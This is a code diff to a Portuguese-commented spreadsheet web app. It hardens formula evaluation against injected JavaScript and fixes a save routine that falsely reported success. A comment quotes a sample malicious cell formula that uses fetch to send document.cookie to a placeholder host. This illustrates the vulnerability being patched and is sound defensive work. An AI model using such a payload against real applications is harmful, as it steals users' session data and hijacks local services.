@@ -533,7 +533,35 @@ function evaluateFormula(formula, rowData, headers) {
     e2 = e2.replaceAll(ph, val);
   });
 
+  // `=[FCK]+[MPA 28]` virava `[25]+[31]`, e somar duas listas em JavaScript
+  // devolve o TEXTO "2531" em vez de 56. O resultado sai na célula com cara de
+  // número e ninguém confere uma soma de dois campos.
+  // Os colchetes são só a marcação do nome da coluna; depois de trocado pelo
+  // número eles não têm mais função nenhuma.
+  e2 = e2.replace(/\[\s*(-?\d+(?:\.\d+)?)\s*\]/g, '$1');
+
   try {
+    // Depois de trocar os nomes de coluna por números, só pode ter sobrado
+    // conta. Qualquer outra coisa é texto que veio da planilha — e planilha
+    // vem de fora: de cliente, de outro laboratório, de anexo de e-mail.
+    //
+    // Sem esta linha, uma célula escrita `=fetch('http://x/?c='+document.cookie)`
+    // rodava sozinha ao ABRIR o arquivo. Ninguém precisa clicar em nada:
+    // renderBody() calcula as fórmulas para poder mostrar o resultado. E
+    // daqui dá para falar com o próprio programa — salvar por cima do arquivo
+    // do usuário, ler as abas abertas — porque ele atende em 127.0.0.1 sem
+    // senha nenhuma.
+    //
+    // A mesma trava já existia em resolveValExpr, usada pelos filtros.
+    // Faltava justamente no cálculo principal da planilha.
+    //
+    // Os colchetes entram na lista porque a sintaxe daqui é `=[FCK]/2`: o nome
+    // da coluna vira número mas os colchetes ficam, e `[25]/2` é uma conta
+    // válida. Sem eles eu quebrava toda fórmula do programa — foi o autoteste
+    // que pegou. Continuam seguros porque letra, aspas e vírgula estão fora:
+    // sem elas não dá para escrever nome de função nem texto, e `[25]` só pode
+    // ser uma lista de números.
+    if (/[^0-9+\-*/%.\s()[\]eE]/.test(e2)) return '#ERRO!';
     const r = Function('"use strict"; return (' + e2 + ')')();
     // Divisão por zero / resultado inválido: mostra erro legível na célula
     // em vez de "Infinity" ou "NaN".
@@ -1325,11 +1353,18 @@ function markSaved() { document.getElementById('btn-save-file')?.classList.remov
 // A gravacao no servidor e' adiada meio segundo. Toda operacao que roda no
 // SERVIDOR (salvar, cruzar, recarregar, exportar) precisa da versao atual —
 // sem isto, editar uma celula e clicar em Salvar gravava o valor ANTIGO.
+// Devolve se a última alteração chegou mesmo ao servidor.
+//
+// Antes não devolvia nada e ninguém olhava. Corrigir uma célula e clicar em
+// Salvar dentro do meio segundo de espera fazia esta função ser chamada — e
+// se ELA falhasse, saveFile() seguia em frente e gravava no disco o que o
+// servidor tinha ANTES da correção, avisando "Salvo". A pessoa via um erro de
+// conexão e um sucesso logo depois, e ficava com o arquivo sem a correção.
 async function enviarPendencias() {
-  if (!_saveEmEspera || !state.activeSheet) return;
+  if (!_saveEmEspera || !state.activeSheet) return true;
   clearTimeout(_saveTimer);
   _saveEmEspera = false;
-  await apiFetch('/api/save_data', {
+  const r = await apiFetch('/api/save_data', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
@@ -1339,6 +1374,11 @@ async function enviarPendencias() {
       data: state.data
     })
   });
+  if (r === null || (r && r.success === false)) {
+    _saveEmEspera = true;      // continua pendente: não foi enviada
+    return false;
+  }
+  return true;
 }
 
 let _salvandoAgora = false;
@@ -1352,7 +1392,15 @@ async function saveFile() {
   if (_salvandoAgora) return;            // clique duplo em planilha grande
   _salvandoAgora = true;
   setStatus('Salvando...', 'busy');
-  await enviarPendencias();
+  // Se a última alteração não chegou ao servidor, gravar agora escreveria o
+  // arquivo SEM ela — e diria que deu certo. Melhor não gravar e avisar.
+  if (!(await enviarPendencias())) {
+    toast('Não consegui confirmar a sua última alteração — nada foi gravado. ' +
+          'Tente salvar de novo.', 'error');
+    setStatus('Não salvo', 'error');
+    _salvandoAgora = false;
+    return;
+  }
   const post = body => apiFetch('/api/save_file', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
